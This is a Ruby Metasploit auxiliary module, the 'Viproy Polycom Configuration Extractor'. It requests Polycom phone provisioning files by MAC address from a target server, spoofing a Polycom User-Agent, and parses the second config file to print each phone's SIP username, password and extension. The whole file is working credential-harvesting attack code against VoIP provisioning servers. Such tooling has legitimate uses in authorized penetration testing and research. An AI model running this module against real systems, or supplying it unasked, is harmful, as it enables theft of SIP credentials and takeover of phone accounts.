##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient


  def initialize
    super(
        'Name'        => 'Viproy Polycom Configuration Extractor Module',
        'Version'     => '1',
        'Description' => 'Viproy Polycom Configuration Extractor Module',
        'Author'      => 'fozavci',
        'License'     => 'GPL'
    )

    register_options(
        [
            OptString.new('MAC',   [ false, "MAC Address"]),
            OptString.new('MACFILE',   [ false, "Input file contains MAC Addresses"]),
            OptString.new('TARGETURI', [ true, 'Target URI for configuration files', '/']),
            Opt::RHOST,
            Opt::RPORT(8088),
        ], self.class)
    register_advanced_options(
        [
            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
        ], self.class)
  end
  def run
    raise RuntimeError ,'MAC or MACFILE should be defined' unless datastore['MAC'] or datastore['MACFILE']
    if datastore['MACFILE']
      macs = macfileimport(datastore['MACFILE'])
    else
      macs = []
    end
    macs << datastore['MAC'].upcase if datastore['MAC']
    uri=datastore["TARGETURI"] || "/"


    macs.each do |mac|
      begin
        vprint_status("The initial configuration file is requesting: #{uri}/#{mac.downcase}.cfg")
        res = send_request_cgi({
           'uri'          =>  "#{uri}/#{mac.downcase}.cfg",
           'method'       => 'GET',
           'User-Agent'   => 'FileTransport PolycomSoundPointIP-SPIP_335-UA/4.2.2.0710',
        }, 20)
        if res.code == 200
          file=extract_conf_file(res.body)
          vprint_status("The second configuration file is requesting: /#{file}")
          res = send_request_cgi({
             'uri'          =>  "/#{file}",
             'method'       => 'GET',
             'User-Agent'   => 'FileTransport PolycomSoundPointIP-SPIP_335-UA/4.2.2.0710',
          }, 20)
          if res.code == 200
            username,password,ext=extract_creds(res.body)
            return if username.nil?
            print_good("MAC address\t: #{mac}")
            print_good("Extension\t: #{ext}")
            print_good("Username\t: #{username}")
            print_good("Password\t: #{password}\n")
          else
            vprint_status("Phone configuration file could not parsed")
          end
        else
          vprint_status("Initial configuration file is not available at the server")
        end
      rescue Rex::ConnectionError => e
        print_error("Connection failed: #{e.class}: #{e}")
        return nil
      end
    end
  end
  def extract_conf_file(data)
    doc = Nokogiri::XML(data)
    file=doc.at("APPLICATION")["CONFIG_FILES"].split(",")[1]
    vprint_status(data) if datastore["DEBUG"] == true
    return file
  end
  def extract_creds(data)
    doc = Nokogiri::XML(data)
    vprint_status(data) if datastore["DEBUG"] == true
    case
      when doc.at('phone')
        d=doc.at('phone')
      when doc.at('provisional')
        d=doc.at('provisional')
      else
        print_error("Configuration file couldn't be parsed")
        return nil
    end
    username=d["reg.1.auth.userId"]
    password=d["reg.1.auth.password"]
    ext=d["reg.1.address"]
    return username,password,ext
  end
  def macfileimport(f)
    vprint_status("MAC File is "+f.to_s+"\n")
    macs = []
    contents=IO.read(f)
    contents.split("\n").each do |line|
      macs << line.upcase
    end
    return macs
  end
end

